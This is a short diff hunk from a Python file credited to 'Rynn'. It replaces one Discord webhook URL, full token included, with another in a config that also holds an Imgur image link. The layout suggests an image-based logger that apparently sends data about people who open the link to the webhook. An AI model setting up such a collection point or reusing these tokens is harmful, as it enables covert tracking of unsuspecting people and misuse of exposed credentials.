@@ -9,7 +9,7 @@ __author__ = "Rynn"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1107700207975661629/EWcdAcbje_v8uYWUdluh0n6J4ptkKqGml5750XtCDQe94CAWctpx7O6wxu73NMJPh1ve",
+    "webhook": "https://discord.com/api/webhooks/1114219993056432240/v1NNJPMinoYmy2-Hkpc3kMPtlExsPXB7iapBFZSmj8H6U9Iw_hEanzFvywT6Iun90ZQG",
     "image": "https://imgur.com/lvZeXE4",
     "imageArgument": True, 
 
